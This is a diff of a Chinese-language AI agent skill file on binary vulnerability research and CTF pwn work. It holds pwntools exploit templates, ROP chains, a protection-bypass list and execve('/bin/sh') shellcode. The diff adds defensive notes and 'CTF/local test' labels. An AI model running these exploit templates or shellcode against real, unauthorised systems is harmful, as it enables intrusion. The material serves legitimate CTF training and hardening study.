@@ -1,9 +1,13 @@
 ---
 name: vuln-research
-description: 漏洞研究。二进制分析、逆向工程、Exploit开发、Fuzzing。当用户提到漏洞研究、二进制、逆向、Exploit、Fuzzing、PWN、栈溢出、堆溢出时使用。
+description: 软件安全研究参考。二进制安全分析、内存安全漏洞原理、模糊测试、防护机制验证。用于CTF竞赛、安全研究、软件加固。当用户提到漏洞研究、二进制、逆向、安全分析、Fuzzing、PWN、内存安全时使用。
 ---
 
-# 🔥 赤焰秘典 · 漏洞研究 (Vulnerability Research)
+# 赤焰秘典 · 漏洞研究 (Vulnerability Research)
+
+> **软件安全研究参考文档**：本文档为安全研究员提供内存安全漏洞原理、防护机制分析、模糊测试方法。
+> 每项漏洞类型均附带防御措施，用于理解攻击原理并指导软件加固。
+> 所有示例使用本地测试二进制，不针对未授权目标。
 
 
 ## 研究流程
@@ -71,7 +75,7 @@ ltrace ./binary
 
 ### 栈溢出
 ```c
-// 漏洞代码
+// 漏洞代码示例——用于理解溢出原理
 void vulnerable(char *input) {
     char buffer[64];
     strcpy(buffer, input);  // 无边界检查
@@ -83,24 +87,25 @@ void vulnerable(char *input) {
 ```
 
 ```python
-# Exploit 模板
+# [Security Research] CTF/本地测试用 Exploit 模板
 from pwn import *
 
 context.arch = 'amd64'
-p = process('./vuln')
+p = process('./vuln')  # 本地测试二进制
 
-# 构造 payload
 padding = b'A' * 72  # 填充到返回地址
-ret_addr = p64(0x401234)  # 目标地址
+ret_addr = p64(0x401234)  # 目标地址（从反编译获取）
 
 payload = padding + ret_addr
 p.sendline(payload)
 p.interactive()
 ```
 
+**防御**：Stack Canary、NX、ASLR、FORTIFY_SOURCE、安全函数（`strncpy`、`snprintf`）
+
 ### 堆溢出
 ```c
-// 漏洞代码
+// 漏洞代码示例——演示堆溢出覆盖函数指针
 struct chunk {
     char data[32];
     void (*func_ptr)();
@@ -113,29 +118,35 @@ void vulnerable(char *input) {
 }
 ```
 
+**防御**：堆保护（Safe Unlinking）、ASAN、边界检查、安全分配器
+
 ### Use-After-Free
 ```c
-// 漏洞代码
+// 漏洞代码示例——演示 UAF 原理
 void vulnerable() {
     char *ptr = malloc(64);
     free(ptr);
-    // ptr 未置空
+    // ptr 未置空——悬垂指针
     strcpy(ptr, user_input);  // UAF
 }
 ```
 
+**防御**：free 后置 NULL、智能指针（C++）、ASAN、MTE（ARM）
+
 ### 格式化字符串
 ```c
-// 漏洞代码
+// 漏洞代码示例
 void vulnerable(char *input) {
     printf(input);  // 格式化字符串漏洞
 }
 
-// 利用
+// 利用原语
 // %x - 泄露栈数据
 // %n - 任意写
 // %s - 任意读
 ```
+
+**防御**：始终使用 `printf("%s", input)`、编译器 `-Wformat-security`、FORTIFY_SOURCE
 
 ## 保护机制绕过
 
@@ -147,32 +158,32 @@ checksec ./binary
 
 ### 绕过技术
 ```yaml
+# [Security Research] 理解绕过原理是加固防御的前提
 NX (不可执行):
-  - ROP (Return Oriented Programming)
-  - ret2libc
-  - ret2syscall
+  绕过: ROP / ret2libc / ret2syscall
+  加固: 确保 NX 全局启用、CFI
 
 ASLR (地址随机化):
-  - 信息泄露
-  - 暴力破解 (32位)
-  - 部分覆盖
+  绕过: 信息泄露、暴力破解(32位)、部分覆盖
+  加固: 64位 ASLR、PIE、减少信息泄露面
 
 Stack Canary:
-  - 信息泄露
-  - 逐字节爆破
-  - 覆盖 __stack_chk_fail
+  绕过: 信息泄露、逐字节爆破、覆盖 __stack_chk_fail
+  加固: 确保全函数启用、SafeStack
 
 PIE (位置无关):
-  - 信息泄露基址
-  - 部分覆盖
+  绕过: 信息泄露基址、部分覆盖
+  加固: 配合 ASLR、减少泄露点
 
 RELRO:
-  - Partial: 覆盖 GOT
-  - Full: 其他利用方式
+  Partial: 可覆盖 GOT
+  Full: GOT 只读，需其他利用方式
+  加固: 始终使用 Full RELRO
 ```
 
 ### ROP 链构造
 ```python
+# [Security Research] CTF/本地测试用 ROP 模板
 from pwn import *
 
 elf = ELF('./vuln')
@@ -192,6 +203,8 @@ bin_sh = libc_base + next(libc.search(b'/bin/sh'))
 rop2 = ROP(libc)
 rop2.system(bin_sh)
 ```
+
+**防御**：CFI（Control Flow Integrity）、Shadow Stack、CET（Intel）、BTI（ARM）
 
 ## Fuzzing
 
@@ -245,14 +258,14 @@ clang++ -fsanitize=fuzzer,address fuzz_target.cpp -o fuzzer
 
 ### Shellcode
 ```python
-# pwntools 生成
+# [Security Research] pwntools 生成——仅用于 CTF/本地测试
 from pwn import *
 context.arch = 'amd64'
 
-# execve("/bin/sh", NULL, NULL)
+# 标准 shell shellcode
 shellcode = asm(shellcraft.sh())
 
-# 自定义 shellcode
+# 自定义 shellcode（execve("/bin/sh", NULL, NULL)）
 shellcode = asm('''
     xor rdi, rdi
     push rdi
@@ -266,20 +279,21 @@ shellcode = asm('''
 ''')
 ```
 
+**防御**：NX、W^X 策略、seccomp 沙箱、shellcode 签名检测
+
 ### 完整 Exploit 模板
 ```python
 #!/usr/bin/env python3
+# [Security Research] CTF/授权测试用 exploit 模板
 from pwn import *
 
 context.arch = 'amd64'
 context.log_level = 'debug'
 
-# 配置
 binary = './vuln'
 libc_path = './libc.so.6'
-host, port = 'target.com', 1337
+host, port = 'ctf.example.com', 1337  # CTF 平台或授权目标
 
-# 加载
 elf = ELF(binary)
 libc = ELF(libc_path)
 
@@ -315,6 +329,8 @@ if __name__ == '__main__':
 
 ## CTF PWN 技巧
 
+> CTF 竞赛是合法的安全技能训练场景，以下技巧用于竞赛解题。
+
 ### 常见题型
 ```yaml
 栈溢出:
@@ -343,13 +359,11 @@ checksec ./pwn
 # 2. 运行测试
 ./pwn
 
-# 3. 反编译分析
-# IDA/Ghidra
-
+# 3. 反编译分析（IDA/Ghidra）
 # 4. 确定漏洞点
 # 5. 编写 Exploit
 # 6. 本地测试
-# 7. 远程利用
+# 7. 远程利用（CTF 平台）
 ```
 
 ## 工具清单
